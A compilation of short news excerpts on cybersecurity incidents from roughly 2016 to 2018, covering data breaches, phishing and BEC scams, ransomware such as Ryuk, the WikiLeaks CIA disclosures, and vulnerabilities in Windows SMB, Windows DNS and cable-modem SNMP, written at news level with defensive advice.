The vulnerability is in the SMB (Server Message Block) and is caused by the platform's inability to properly handle a specially-crafted server response that contains too many bytes following the structure defined in the SMB2 TREE_CONNECT Response structure, according to a Feb 2 CERT advisory.
If a user connects to a malicious SMB server, a vulnerable Windows client system may crash and display a blue screen of death (BSOD) in mrxsmb20.sys, the advisory said.
Researchers have confirmed the flaw affects fully-patched Windows 10 and Windows 8.1 client systems, as well as the server equivalents of these platforms, Windows Server 2016 and Windows Server 2012 R2.
The vulnerability is still being examined and it is possible that the flaw may enable more exploits as well.
A researcher by the moniker “PythonResponder” first reported the zero day and a proof-of-concept code was published to GitHub shortly after.
It is recommended that users consider blocking outbound SMB connections from the local network to the WAN in order to prevent remote attackers from causing denial of service attacks.

On January 20, an email from Lynn Jurich, CEO of San Francisco-based solar firm Sunrun, popped up in a payroll department employee's inbox. The CEO was requesting copies of all employee W-2 forms, which were about to be sent out in preparation for tax season.
The employee responded quickly as requested, not realizing the W-2 forms — containing the addresses, social security numbers, and salary information for Sunrun's nearly 4,000 employees — were actually being delivered to a scam artist.
Tax season is always a busy time for scammers seeking to gain access to sensitive information,  but this year attacks are coming earlier and in greater numbers than usual. The uptick has caused the IRS to release an urgent alert warning employers to be on the lookout for what they're refering to as ""one of the most dangerous email phishing scams we’ve seen in a long time.""
By using email spoofing techniques, criminals are able to draft emails that look as though they are coming directly from a high-level executive at your organization. They send the message to an employee in the payroll department or HR and include a request for a list of the organization's employees along with their W-2 forms.
Their initial goal is to use the W-2 information to file fraudulent tax returns and claim refunds. But not all criminals are stopping there. Once they've found a responsive victim, a portion are also following up with additional email requesting a wire transfer be made to an account they provide. 
Also referred to as business email compromise (BEC), these attacks have claimed more than 15,000 victims and cost organizations more than $1 billion over the past three years.

After national reports in the press this week where bank customers have been targeted by a ‘smishing’ scam, including a man from Coventry, Trading Standards is advising all residents to be on their guard.
Smishing messages (SMS + fishing) usually contain a phony telephone number to call or link to a counterfeit website that will ask you to enter personal details or transfer money as your account is at risk. They can also ask you to call or text a premium-rate number they have created to run up a large bill.
In the reports this week, three customers of the same bank received text messages to say that there had been unusual activity on their accounts and given a phone number to call.
When called, the people were convinced to give access to their online banking which generated a security code, which was then used to siphon money from accounts.
‘Take Five’ is a new campaign by Financial Fraud Action UK (FFA UK) designed to tackle financial fraud and is the first national campaign to be backed by all the major banks and other financial service providers across the UK. 
You can protect yourself from financial fraud by remembering some simple advice: 
    Never disclose security details, such as your PIN or full password - it’s never okay to reveal these details.
    Don’t assume an email request or caller is genuine - people aren’t always who they say they are.
    Don’t be rushed – a genuine bank or organisation won’t mind waiting to give you time to stop and think.
    Listen to your instincts – if something feels wrong then it is usually right to pause and question it.
    Stay in control – have the confidence to refuse unusual requests for information.
With financial fraud getting ever more sophisticated, anyone can be targeted and incidents are on the increase. Trading Standards advise to always be cautious with any unsolicited approaches.

Allrecipes, the self-described ""food-focused social network"", has sent an email out to some of its users warning that their email addresses and passwords may have been intercepted by an unknown third-party.
In the email, the site warns that users who registered an allrecipes.com account or logged on as a registered member of the site prior to June 2013 (yes, that's almost four years ago), may have had their email address and password stolen.
Part of the email reads as follows:
We recently determined that the email address and password typed into allrecipes.com by members when they created or logged into their accounts prior to June 2013 may have been intercepted by an unauthorized third party. Based on information available to us, we cannot determine with certainty who did this or how this occurred. Our best analysis is that email addresses and allrecipes.com passwords were intercepted during account registration or login by our members.
To its credit, the site has advised affected users to change their Allrecipes password, and ensure that they are not using the same password anywhere else on the net:
Out of an abundance of caution, we recommend that all members who registered or logged into allrecipes.com prior to June 2013 promptly change their password. We are taking other steps as well and will continue to work diligently to deter unauthorized activity.
You should promptly change your password on allrecipes.com and on any other sites for which you use the same username and password. 
From what I have seen, Allrecipes has only mentioned the breach when asked direct questions about it via Twitter. How hard would it have been to post a link to an advisory on the front page of its website, and tweet out a link to it?.
Clearly plenty of questions remain about how this security breach might have happened, and Allrecipes' response to it.  But at the very least I would have been pleased to see them be more transparent with their users.
The data breach has, understandably, left an unpleasant taste in the mouths of affected users - some of whom turned to Twitter to express themselves.
That Twitter user is correct.  It's not just a problem that their password has been exposed.  Passwords, after all, can be changed fairly easily and if you're only using it one place than the risks are, at least, reduced.
Most users, however, only have one email address and aren't keen to change them that often.  A hacker who has stolen your email address and password may not only attempt to use those credentials to unlock other online accounts you own, but might also monetise their theft by launching spam or phishing attacks against your inbox.

The world governing body of track and field said Monday that it was the victim of a cyberattack carried out by the infamous Fancy Bear hacking group.
The International Association of Athletics Federations (IAAF) said the hack had ""compromised athletes' Therapeutic Use Exemption (TUE) applications stored on IAAF servers.""
However, ""it is not known if this information was subsequently stolen from the network.""
The Fancy Bear website and Twitter account bore no mention of the hacks Monday morning.
TUEs are special exemptions given to athletes that allow them to take otherwise banned substances if they have a specific medical need.
A statement on the IAAF website said: ""The presence of unauthorized remote access to the IAAF network by the attackers was noted on 21 February where meta data on athlete TUEs was collected from a file server and stored in a newly created file.""
While the IAAF did not know if that data was eventually taken, it said there was “a strong indication of the attackers’ interest and intent.”
Fancy Bear was responsible for a hack that targeted the World Anti-Doping Agency (WADA) last year, subsequently revealing what it said were TUEs granted to a host of U.S. Olympics stars.
NBC News reported details of the suspected hack of WADA files in August saying it was part of the same covert influence campaign by Russian President Vladimir Putin's government to target the U.S. government, political organizations and others and potentially disrupt the November election.
U.S. officials have also previously linked Fancy Bear to GRU, the Russian military intelligence agency. However, Russian officials denied playing any role in the various hacks attributed to Fancy Bear.
The IAAF said athletes who have applied for TUEs since 2012 have been contacted. It added that it had since carried out a ""complex remediation across all systems and servers in order to remove the attackers’ access to the network.""
IAAF President Sebastian Coe also weighed in.
""Our first priority is to the athletes who have provided the IAAF with information that they believed would be secure and confidential,"" he said. ""They have our sincerest apologies and our total commitment to continue to do everything in our power to remedy the situation and work with the world’s best organizations to create as safe an environment as we can.""

The top U.S. spy agency is going public with concerns about the latest document dump by the online whistle-blower organization WikiLeaks, warning that all Americans should be ""deeply concerned"" about the potential fallout.
A spokesman for the U.S. Central Intelligence Agency refused to comment Wednesday on the authenticity of the 8,771 documents, but argued there could be little doubt about WikiLeaks' intentions ""to damage the Intelligence Community's ability to protect America against terrorists and other adversaries.""
""Such disclosures not only jeopardize U.S. personnel and operations, but also equip our adversaries with tools and information to do us harm,"" CIA spokesman Jonathan Liu said in a statement.
White House press secretary Sean Spicer also expressed alarm Wednesday, telling reporters the U.S. ""will go after people who leak classified information.""
""This is the kind of disclosure that undermines our security, our country and our well-being,"" he told reporters, adding President Donald Trump is ""extremely concerned.""
Review of documents
Like the CIA, Spicer refused to confirm the authenticity of the WikiLeaks documents.
But several cybersecurity experts and former intelligence officials who reviewed them told VOA that they appeared to be real.
WikiLeaks said it obtained the documents from a former U.S. government hacker.
And a U.S. intelligence official told VOA, on condition of anonymity, that it appeared a CIA contractor might have been the source.
""There's always someone with the permissions to do this sort of thing,"" said Alex McGeorge, the head of Threat Intelligence at Immunity Inc., a cyber firm that does some work with government agencies.
McGeorge also said that while the disclosures were damaging, WikiLeaks' claim that the documents dump represented the CIA's ""entire hacking capacity"" was most likely overblown.
""What we currently have in this dump doesn't provide a whole lot,"" he said.
Many of the WikiLeaks documents appeared to be online transcripts of conversations between intelligence agency employees working to exploit software to turn digital devices — such as mobile phones like Apple or Android smartphones, or even Samsung's smart televisions — into listening devices.
Limiting damage
But at least for now, WikiLeaks appears to be limiting the damage.
""They didn't disclose the code, at least, and populate the marketplace with what we would consider cyberweapons left on the battlefield that can be reverse-engineered and used against us,"" said Jeff Bardin, CIO of the cybersecurity firm Treadstone 71 and a former member of U.S. Air Force intelligence.
In its statement Tuesday, WikiLeaks said it was only holding off on releasing the critical codes ""until a consensus emerges on the technical and political nature of the CIA's program and how such weapons should be analyzed, disarmed and published.""
Even more worrisome for some current and former U.S. and Western officials, though, is the possibility of Russian involvement.
""I'm now pretty close to the position that WikiLeaks is acting as an arm, as an agent of the Russian Federation,"" former CIA Director Michael Hayden, a retired Air Force general, told CNN Wednesday.
Other former officials noted Russia was on the short list of countries capable of foiling the CIA's cyber efforts.
""It is in Russia's interest to see the CIA discredited,"" former British cybersecurity official Jonathan Shaw said Tuesday, following the WikiLeaks disclosure.
A January report by the U.S. intelligence community also concluded with ""high confidence"" there was an ongoing relationship between Russian intelligence and WikiLeaks.

Washington University School of Medicine is committed to protecting the security and confidentiality of our patients’ information. We regret, however, that information about some of our patients may have been accessed by an unauthorized third party due to an email “phishing” incident.
On January 24, 2017, the medical school learned that some of its employees responded to a Dec 2, 2016, “phishing” email, believing it to be a legitimate request. A “phishing” email is designed to look like a legitimate email but tricks the recipient into taking some action, such as providing login credentials. Upon learning of the incident, we secured the email accounts and began an investigation. The investigation could not rule out that an unauthorized third party may have gained access to some employees’ email accounts. We conducted a detailed review of the employees’ email accounts and confirmed that some of the emails contained patient information, which may have included names, birth dates, medical record numbers, diagnosis and treatment information, other clinical information, and in some instances Social Security numbers. We reported the phishing incident to law enforcement and are cooperating with the investigation.
We have no indication that the information in the emails has been misused. However, as a precaution, we began mailing letters to affected patients on March 24, 2017, and have established a dedicated call center to answer any questions patients may have. If you believe you may be affected and have not received a letter by April 24, 2017, or if you have any questions regarding this incident, please call 844-641-5630.

Hundreds of thousands of internet gateway devices around the world, primarily residential cable modems, are vulnerable to hacking because of a serious weakness in their Simple Network Management Protocol implementation.
SNMP is used for automated network device identification, monitoring and remote configuration. It is supported and enabled by default in many devices, including servers, printers, networking hubs, switches and routers.
Independent researchers Ezequiel Fernandez and Bertin Bervis recently found a way to bypass SNMP authentication on 78 models of cable modems that ISPs from around the world have provided to their customers.
Their internet scans revealed hundreds of thousands of devices whose configurations could be changed remotely through the SNMP weakness that they found and dubbed StringBleed.
The leaking of sensitive configuration data through the default ""public"" SNMP community string is a known problem that has affected many devices over the years.
The two researchers first located a small number of vulnerable devices, including the Cisco DPC3928SL cable modem that's now part of Technicolor's product portfolio following the company's acquisition of Cisco's Connected Devices division in 2015.
The researchers claim that when they reported the issue to Technicolor, the company told them that it was the result of an access misconfiguration by a single ISP in Mexico rather than a problem with the device itself.
This prompted the researchers to perform a wider internet scan that resulted in the discovery of 78 vulnerable cable modem models from 19 manufacturers, including Cisco, Technicolor, Motorola, D-Link and Thomson.
Regardless of the cause, the problem is serious, as attackers could exploit this flaw to extract administrative and Wi-Fi passwords or to hijack devices by modifying their configurations.
There's not much that users can do if their ISP supplied them with a vulnerable device, other than ask for a different model or install their own modem. Unfortunately, not many ISPs allow their residential customers to use their own gateway devices, because they want uniformity and remote management capabilities on their networks.
Determining if a particular device is vulnerable to this issue is possible, but requires a bit of work. An online port scanner like ShieldsUp can be used to determine if the device responds to SNMP requests over its public IP address.
If SNMP is open, a different online tool can be used to check if the device's SNMP server returns valid responses when the ""public"" or random community strings are used. At the very least this would indicate an information leak problem.

 The Managing Director of a company held to ransom by hackers has warned other bosses to protect themselves against cyber crooks − or run the risk of web sharks crippling their businesses.
Stuart Kettell − owner of audio-visual specialist Kettell Video Productions − was targeted by tech scammers who infiltrated his firm’s IT systems with malware that infected its network of files.
They demanded £1,000 initially in Bitcoins to decrypt the malicious software − and warned that failure to pay would render the files permanently inaccessible.
Thankfully Stuart routinely backs-up all company systems − and even backs up the back-ups − so survived the online attack relatively unscathed.
But he’s warned that without the archive of replicas his entire business could have collapsed.
He said: “I noticed all my photos, videos and pdf files ghosting to white with a new filename…it attacked my desktop first then it wormed its way into folders one file at a time every few seconds. 
“I’ve no idea how the malware was introduced as we use software that’s designed to prevent against such attacks. And the demand for payment seemed very professional: I was given links where I could buy Bitcoins and even offered the chance to decrypt one file for free! 
“I unplugged my computer, isolated it from the internet, and ran some anti-malware software to stop the virus spreading further. 
“It was scary: I had no idea about cyber-attacks before and really didn’t know what to do. Critical files, including images and videos for clients, were wiped out along with a lifetime of personal memories.
“The affected files were lost for good − the only way to recover them was with the key code held by the blackmailer − but luckily I back-up everything to an external data cartridge. In the end it was more an inconvenience…but it could have threatened the business.
“I would strongly urge all business owners to back-up their essential files.""
Sergeant Gary Sirrell from the cybercrime team at West Midlands Regional Organised Crime Unit said commercial web attacks are increasingly being committed against smaller firms and not big multi-nationals.
He explained: “Small and medium sized companies are easier targets: they often don’t have the resources or expertise to protect against cyberattacks. And if they are targeted, the impact can be devastating. 
“But there are steps business owners can take to mitigate the risk. A really effective tactic involves ‘layering’ defences to include a firewall, anti-malware software, staff training and regular re-training) around phishing email awareness, and finally to plug any holes in your defences by updating software patches and updates in a timely manner.
“By exercising good cyber hygiene, and having a strong backup policy, Stuart avoided the dilemma of whether to see his business significantly damaged, or to have to hand over a ransom to organised crime gangs to get his data unlocked. 
“If more businesses in the West Midlands proactively took such steps there would be significantly fewer crimes victims.""

According to a research report by AppRiver, the attack hit Denmark, Germany, and several surrounding Scandinavian countries on Wednesday morning.
The attack was unusual in that it narrowly targeted a specific audience, said Troy Gill, security analyst at AppRiver.
""Somehow, they found this language-based list of email addresses,"" he said.
Dropbox is an attractive avenue for malware because it is a popular service, and because email providers are increasingly putting stringent limits on the kinds of files that can be sent as attachments.
Each of the links in the malware was unique, and generated randomly, suggesting that the attackers used an automated script to create the Dropbox file shares.
""There's a weakness there that they're exploiting,"" Gill said.
""There's always a trade-off of convenience versus usability.""
The messages claimed to provide shipping details, and a fake invoice.
But the file was actually a .zip archive that contained a JavaScript file which contained a Trojan dropper.
The attackers continued to send out the emails for about 12 hours.
However, Gill gave Dropbox credit for responding quickly.
""I would say that after about an hour, we saw a lot of the links disabled,"" he said.
""After two hours, I was hard press to find a link that wasn't disabled.""
Altogether, Gill estimated that the attackers had sent out hundreds of thousands, and possibly millions of messages.
And since the messages arrived right at the start of the workday in Europe, it wouldn't have taken long for potential victims to open the emails and click on the links.
The attackers just need a small window of opportunity, he said.
In addition to using spam filters, anti-virus, and training employees to identify malicious emails, there are other things enterprises can do to protect against this particular threat vector.
For example, Gill said, companies could decide not to allow Dropbox in their environment.
""If you wanted to be aggressive, you could ban inbound Dropbox content links,"" he said.
""And if you decided that your organization wasn't going to use it, you could easily make a change to your spam filter or your web filter to block access to Dropbox entirely.""
Dropbox does pose other potential security risks for enterprises as well, he added.
""Giving your employees freedom to use it is a risky thing,"" he said.
""Who knows what they'll put in it, either on purpose or by accident.""

Facebook discovered a security issue that allowed hackers to access information that could have let them take over around 50 million accounts, the company announced on Friday. Following the disclosure, shares of Facebook extended midday losses and ended trading 2.5 percent down.
""This is a very serious security issue, and we're taking it very seriously,"" said CEO Mark Zuckerberg on a call with reporters.
Facebook shares, which were already down about 1.5 percent before the announcement, extended losses after the disclosure and ended down 2.6 percent.
The company said in a blog post that its engineering team found on Tuesday that attackers identified a weakness in Facebook's code regarding its ""View As"" feature. Facebook became aware of a potential attack after it noticed a spike in user activity on September 16.
""View As"" lets users see what their profile looks like to other users on the platform. This vulnerability, which consisted of three separate bugs, also allowed the hackers to get access tokens — digital keys which let people stay logged into the service without having to re-enter their password — which could be used to control other people's accounts.
Almost 50 million accounts had their access tokens taken, and Facebook has reset those tokens. The company also reset tokens for an additional 40 million accounts who used the ""View As"" feature in the last year as a precautionary measure, for a total of 90 million accounts. Facebook had 2.23 billion monthly active users as of June 30.
The reset will require these users to re-enter their password when they return to Facebook or access an app that uses Facebook Login. They will also receive a notification at the top of their News Feed explaining what happened.
In addition, the company suspended the ""View As"" feature while it reviews its security. Facebook said it fixed the issue on Thursday night and has notified law enforcement including the FBI and the Irish Data Protection Commission in order to any address General Data Protection Regulation (GDPR) issues.
Facebook said it has just begun its investigation and has not determined if any information was misused, but the initial investigation has not uncovered any information abuse. The hackers did query Facebook's API system, which lets applications communicate with the platform, to get more user information. The company is not sure if the hackers used that data, nor does it know who orchestrated the hack or where the person or people are based.
The company said there is no need to change passwords. If additional accounts are affected, Facebook said it will immediately reset those users' access tokens. Facebook is doubling the number of employees who are working to improve security from 10,000 to 20,000, the company reiterated.
""Security is an arms race, and we're continuing to improve our defenses,"" Zuckerberg said. ""This just underscores there are constant attacks from people who are trying to underscore accounts in our community.""

11th December was Microsoft’s December 2018 Patch Tuesday, which means users had to update their computers to be protected from the latest threats to Windows and Microsoft products. Microsoft has fixed 39 vulnerabilities, with 10 of them being labeled as Critical.
Keeping up with its December 2018 Patch Tuesday, Microsoft announced on its blog that a vulnerability exists in Windows Domain Name System (DNS). There was not much information provided to the customers about how and when this vulnerability was discovered. The following details were released by Microsoft:
The Exploit
Microsoft Windows is prone to a heap-based buffer-overflow vulnerability. A remote code execution vulnerability exists in Windows Domain Name System (DNS) servers when they fail to properly handle requests. An attacker who successfully exploits this issue may execute arbitrary code within the context of the affected application. Microsoft states that failed exploit attempts will result in a denial-of-service condition. Windows servers that are configured as DNS servers are at risk from this vulnerability.
Affected Systems
Find a list of the affected systems on Microsoft’s Blog. The company has also provided users with security updates for the affected systems.
Workarounds and Mitigations
As of today, Microsoft has not identified any workarounds or mitigations for the affected systems.
Jake Williams, the founder of Rendition Security and Rally security, posted an update on Twitter about the issue, questioning why there is no sufficient discussion among the infosec community about the matter.

Attributing hacking attacks to the correct perpetrators is notoriously difficult.
Even the U.S. government, for all its technical resources and expertise, took warranted criticism for trying to pin a high-profile 2014 cyberattack on North Korea, and more recently faced skepticism when it blamed Russia for hacks against top Democrats during the 2016 election.
In those cases, government officials said they based their attribution in part on software tools the hackers employed, which had been used in other cyberattacks linked to North Korea and Russia.
But that sort of evidence is not conclusive; hackers have been known to intentionally use or leave behind software and other distinctive material linked to other groups as part of so-called false flag operations intended to falsely implicate other parties.
Researchers at Russian digital security firm Kaspersky Lab have documented such cases.
On Tuesday, WikiLeaks published a large cache of CIA documents that it said showed the agency had equipped itself to run its own false-flag hacking operations.
The documents describe an internal CIA group called UMBRAGE that WikiLeaks said was stealing the techniques of other nation-state hackers to trick forensic investigators into falsely attributing CIA attacks to those actors.
According to WikiLeaks, among those from whom the CIA has stolen techniques is the Russian Federation, suggesting the CIA is conducting attacks to intentionally mislead investigators into attributing them to Vladimir Putin.
“With UMBRAGE and related projects, the CIA can not only increase its total number of attack types, but also misdirect attribution by leaving behind the ‘fingerprints’ of the groups that the attack techniques were stolen from,” WikiLeaks writes in a summary of its CIA document dump.
It’s a claim that seems intended to shed doubt on the U.S. government’s attribution of Russia in the DNC hack; the Russian Federation was the only nation specifically named by WikiLeaks as a potential victim of misdirected attribution.
It’s also a claim that some media outlets have accepted and repeated without question.
“WikiLeaks said there’s an entire department within the CIA whose job it is to ‘misdirect attribution by leaving behind the fingerprints’ of others, such as hackers in Russia,” CNN reported without caveats.
It would be possible to leave such fingerprints if the CIA were reusing unique source code written by other actors to intentionally implicate them in CIA hacks, but the published CIA documents don’t say this.
Instead, they indicate the UMBRAGE group is doing something much less nefarious.
They say UMBRAGE is borrowing hacking “techniques” developed or used by other actors to use in CIA hacking projects.
This is intended to save the CIA time and energy by copying methods already proven successful.

Lying in a hospital bed, the last thing you should have to worry about is a personal data breach. Yet recent research co-authored by a Michigan State University business scholar found nearly 1,800 occurrences of large data breaches in patient information over a seven-year period.
The study, by Xuefeng “John” Jiang, MSU associate professor of accounting, and colleagues from Johns Hopkins and Ball State universities, is published in JAMA Internal Medicine. The data breaches occurred in health care facilities ranging from UC Davis Medical Center in California to Henry Ford Hospital in Michigan.
“Our findings underscore the critical need for increased data protection in the health care industry,” Jiang said. “While the law requires health care professionals and systems to cross-share patient data, the more people who can access data, the less secure it is.”
The researchers examined Department of Health and Human Services data for the period October 2009-December 2016. By law, hospitals covered by the Health Insurance Portability and Accountability Act, or HIPAA, must notify HHS of any breach affecting 500 or more individuals within 60 days from the discovery of the breach.

US Postal Service website flaw was patched this week but reported by a security researcher a year ago.
The US Postal Service has fixed a security bug in its website that allowed anyone with an account to see the account details of the site's 60 million users.
The flaw was patched this week after USPS was informed of the issue by Krebs on Security, which reports that an unnamed independent researcher reported the bug a year ago but never received a response.
According to Krebs, the flaw was caused by an authentication weakness in the application programming interface (API) on usps.com that supported the USPS 'Informed Visibility' program, which offers business customers ""near real-time tracking data"" about mail campaigns and packages. 
The bug let anyone who was logged in to usps.com to see account details for others users, including email address, username, user ID, account number, street address, phone number, authorized users, mailing campaign data and more.
Krebs notes that the ""API also let any user request account changes for any other user, such as email address, phone number or other key details"".
USPS said in a statement it had no information that the vulnerability had been used to access customer records.
""Computer networks are constantly under attack from criminals who try to exploit vulnerabilities to illegally obtain information. Similar to other companies, the Postal Service's Information Security program and the Inspection Service uses industry best practices to constantly monitor our network for suspicious activity,"" USPS said.
""Any information suggesting criminals have tried to exploit potential vulnerabilities in our network is taken very seriously. Out of an abundance of caution, the Postal Service is further investigating to ensure that anyone who may have sought to access our systems inappropriately is pursued to the fullest extent of the law."" 
However, a recent vulnerability assessment of the Informed Visibility program by the Office of Inspector General of the US Postal Service turned up weaknesses, including a lack of audit logs, in the Informed Visibility database.
The partially redacted audit report, published in October, assessed 13 Informed Visibility (IV) servers.
It found overall compliance with Postal Service server configuration baselines, but weakness in the IV database's account-management systems.
""We identified weaknesses in account management controls, specifically with password complexity, disabling user accounts, and maintaining audit logs,"" the OIG report notes.
""Without account management controls, the IV system is at risk for [redacted]. Further, if expired accounts are not disabled in a timely manner, this increases the duration that Postal Service information resources are vulnerable to compromise.
""Additionally, without audit logs, the Postal Service would not be able to obtain sufficient detail to reconstruct activities in the event of a compromise or malfunction"".
USPS has faced scrutiny in the past, after a 2014 hack exposed personal information on 800,000 employees, 485,000 workers' compensation records, and 2.9 million customer-inquiry records.
The OIG in 2015 criticized the USPS for focusing on compliance and failing to foster a ""culture of effective cybersecurity across the enterprise"".

In such scenario, finding a USB port installed somewhere or charging facility at public outlets seems to be a blessing.
Public charging ports are installed almost everywhere for the users and vicitors convenience such as at airports, conference centers, cafes, parks and planes, etc.
All you need to do is plug in your cell phone and feel relaxed and relieved.
However, Drew Paik from IT security security firm Authentic8 told CNN that this is a very dangerous thing to do because the outlet might be hacked and all the data present in your phone could easily be transferred to a hacker.
Authentic8 is the developer of Silo web browser that facilitates anonymous web surfing.
The revelation from Paik is surprising and concerning as he states that simply through plugging in your phone into a hacked charger or power strip would lead to getting your device infected at once and all your data will also be compromised.
The reason is that the cord used to plug in your mobile phone is also used for sending data to and from the device.
For example, if you connect your iPhone to your Mac device using the same charging cord, you can easily transfer images and music from your mobile to your Mac.
Hence, through compromising this particular cord, a hacker can extract all sorts of data from your mobile including pictures, emails, contact numbers, SMS messages, etc., without your knowledge obviously.
The company installed a charging station at its stall and offered to charge cords to visitors so that they could charge their devices.
Then the security firm ran a social experiment to analyze the number of people who used this charging service, which turned out to be quite overwhelming with over 80% of the audience using the charging facility provided by Authentic8.
Paik noted that none of these visitors seemed to care about the security aspect of charging mobiles from a public station despite the fact that they were attending a security conference.
The repercussions are various and diverse, which is why Paik recommends that instead of putting their data in danger, users must carry their chargers or invest in portable USB battery pack.
They may also buy USB cords of their own and connect the chargers using their ports.
The bottom line is that, if you are concerned about the security of your phone’s data, it is better to stop using public ports at all.

This attack model was brought to light towards the end of 2016 by a team of six researchers, who presented their findings at the Black Hat Europe 2016 security conference in November and the 33rd Chaos Communication Congress held last week.
When the ad plays on a TV or radio, or some ad code runs on a mobile or computer, it emits ultrasounds that get picked up by the microphone of nearby laptops, desktops, tablets or smartphones.
Speaking at last week's 33rd Chaos Communication Congress, Vasilios Mavroudis, one of the six researchers, detailed a deanonymization attack on Tor users that leaks their real IP and a few other details.
The attack that the research team put together relies on tricking a Tor user into accessing a web page that contains ads that emit ultrasounds or accessing a page that contains hidden JavaScript code that forces the browser to emit the ultrasounds via the HTML5 Audio API.
According to Mavroudis, the mobile phone must have an app installed that has embedded one of the many advertising SDKs that include support for uXDT.
In tests carried out by Mavroudis, the researcher has intercepted some of the traffic these ultrasound beacons trigger on behalf of the phone, traffic which contains details such as the user's real IP address, geo-location coordinates, telephone number, Android ID, IMEI code, and device MAC address.
According to Mavroudis, there are multiple ways to deliver these attacks other than social-engineering Tor users to access certain URLs, where these ultrasound beacons can be served.
Similarly, the attackers could also run a malicious Tor exit node and perform a Man-in-the-Middle attack, forcibly injecting the malicious code that triggers uXDT beacons in all Tor traffic going through that Tor node.
A simpler attack method would also be to hide the ultrasounds, which are inaudible to human ears, inside videos or audio files that certain Tor users might be opening.
The FBI might be very interested in this method and could deploy it to track viewers of child pornography videos on the Tor network, just like it previously did in Operation Playpen, where it used a Flash exploit.

Email is great for keeping in touch with friends and family and quickly conversing with colleagues but it’s not without its pitfalls.
Scammers approach people via email to encourage them to hand over private or sensitive information about themselves or the company they work for.
“The most prevalent threats we see targeting consumers today are phishing attacks predominantly via email, where scammers try to trick people into sharing private information or access to money,” Jessica Brookes, director of EMEA consumer at McAfee, told the Press Association.
“The first thing you should know about phishing is that it almost always involves a form of ‘social engineering’, in which the scammer tries to manipulate you into trusting them for fraudulent purposes, often by pretending to be a legitimate person or business. Secondly, if an email doesn’t seem legitimate, it probably isn’t; it’s always better to be safe than sorry.”
Here are four of the most popular scams circulating today:
1) The CEO Scam 
This scam appears as an email from a leader in your organisation, asking for highly sensitive information like company accounts or employee salaries. The hackers fake the boss’s email address so it looks like a legitimate internal company email.
That’s what makes this scam so convincing – the lure is that you want to do your job and please your boss. But keep this scam in mind if you receive an email asking for confidential or highly sensitive information, and ask the apparent sender directly whether the request is real, before responding.
2) The Lucky Email
How fortunate! You’ve won a free gift, an exclusive service, or a great deal on a trip abroad. Just remember, whatever “limited time offer” you’re being sold, it’s probably a phishing scam designed to get you to give up your credit card number or identity information. The lure here is something free or exciting at what appears to be little or no cost to you.
3) The Urgent Email Attachment
Phishing emails that try to trick you into downloading a dangerous attachment that can potentially infect your computer and steal your private information have been around for a long time. This is because they work.
You’ve probably received emails asking you to download attachments confirming a package delivery, trip itinerary or prize. They might urge you to “respond immediately”. The lure here is offering you something you want, and invoking a sense of urgency to get you to click.
4) The Romance Scam
This one can happen completely online, over the phone, or in person once initial contact is established. But the romance scam always starts with someone supposedly looking for love. The scammer often poses as a friend-of-a-friend via email and contacts you directly.
But what starts as the promise of love or partnership, often leads to requests for money or pricey gifts.
The scammer will sometimes spin a hardship story, saying they need to borrow money to come visit you or pay their phone bill so they can stay in touch. The lure here is simple – love and acceptance.
Brookes added: “It is everyone’s responsibility to be aware and educate each other – we need to share knowledge and collaborate to protect ourselves against the current threats we face as people living in a connected world.”

A new ransomware strain named Ryuk is making the rounds, and, according to current reports, the group behind it has already made over $640,000 worth of Bitcoin.
Attacks with this ransomware strain were first spotted last Monday, August 13, according to independent security researcher MalwareHunter, who first tweeted about this new threat. 
There have been several reports from victims regarding infections with Ryuk in the past week, including one on the Bleeping Computer forums.
But despite these reports, security researchers from various companies have not been successful at identifying how this ransomware spreads and infects victims.
The common train of thought is that this ransomware spreads via targeted attacks, with the Ryuk crew targeting selected companies one at a time, either via spear-phishing emails or Internet-exposed and poorly secured RDP connections, albeit researchers have not been able to pinpoint the exact entry vector for infections as of yet.
""According to what we can see right now, it seems the attacks are targeted, i.e. a result of some manual compromise,"" Mark Lechtik, a Check Point security researcher, told Bleeping Computer in a private conversation today. 
""Reason for this is that the malware needs Admin privileges to run, which it doesn't achieve on its own. Something else that executes it had to achieve this privilege,"" he added. ""But no artifact was found to show what spawned the execution of the malware (i.e. no mail, document, script etc.).""
Ryuk shuts down over 180 services on infected hosts
But there are also some differences. The main one, spotted by both Check Point and MalwareHunter is that Ryuk comes with a huge list  of apps and services it shuts down before infecting a victim's systems.
""The ransomware will kill more than 40 processes and stop more than 180 services by executing taskkill and net stop on a list of predefined service and process names,"" Check Point researchers explained in a report.
The ransom note conundrum
Furthermore, Ryuk's targeted nature is never more obvious than when it comes to its ransom notes. Check Point says it found several Ryuk samples where the ransomware dropped different ransom notes on users' systems.
Researchers found a long, more verbose ransom note, and another, blunter and to-the-point ransom demand.
Both ransom notes asked victims to contact the Ryuk authors via email. Coincidentally or not, the ransom fees demanded via the longer and more detailed ransom note were higher (50 Bitcoin ~ $320,000), compared to the shorter ransom note, where crooks asked for a smaller amount of money (15-35 Bitcoin, ~$224,000).
""There seems to be some adaptation made in the ransom notes,"" Lechtik told Bleeping Computer, suggesting this particular detail adds up to the assumption that Ryuk is deployed after hackers infect networks and not via mass email spam.
""This could imply there may be two levels of offensive,"" Check Point said, suggesting that the Ryuk gang may also deploy different Ryuk samples based on the organization they manage to infect, and their ability to pay higher ransom fees.
Ryuk not decryptable at the time of writing
As for the ransomware's encryption, this is a classic AES-RSA combo that's usually undecryptable unless the Ryuk team made mistakes in its implementation. Currently, researchers have not spotted such weakness in Ryuk, as of yet.
Similar to most elite ransomware strains, unique Bitcoin payment addresses are created for each victim. Check Point says that money doesn't stay too much in these addresses, and they are quickly split and laundered through different accounts.
While previous versions of the Hermes ransomware have been an on-and-off threat that surfaces at random intervals with a mass spam campaign, the new Ryuk ransomware strain appears to be a new attempt from the Lazarus Group at developing a SamSam-like strain to use in precise surgical strikes against selected organizations.

A Boeing employee inadvertently leaked the personal information of 36,000 of his co-workers late last year when he emailed a company spreadsheet to his non-Boeing spouse.
Forty-seven states, including Washington, have legislation on the books that requires companies or government entities to disclose whenever there’s been a breach of personally identifiable information.
Under Washington law, companies are required to notify the Attorney General’s office if the incident affects more than 500 of the state’s residents.
In this instance Boeing claims the information of 7,288 Washington residents may have been impacted.
According to the letter, the breach occurred on Nov. 21, 2016 after a Boeing employee encountered a formatting issue and emailed a spreadsheet to his spouse who didn’t work at the company.
The file contained sensitive, personally identifiable information of 36,000 of the aircraft manufacturer’s employees.
The file included the names, places of birth, BEMSID, or employee ID numbers, and accounting department codes.
The spreadsheet also included Social security numbers and dates of birth, albeit in “hidden columns,” according to Olson.
Spreadsheet software, such as Microsoft’s Excel, usually allows authors to make select information hidden, usually to prevent that data from being seen, changed, or deleted.
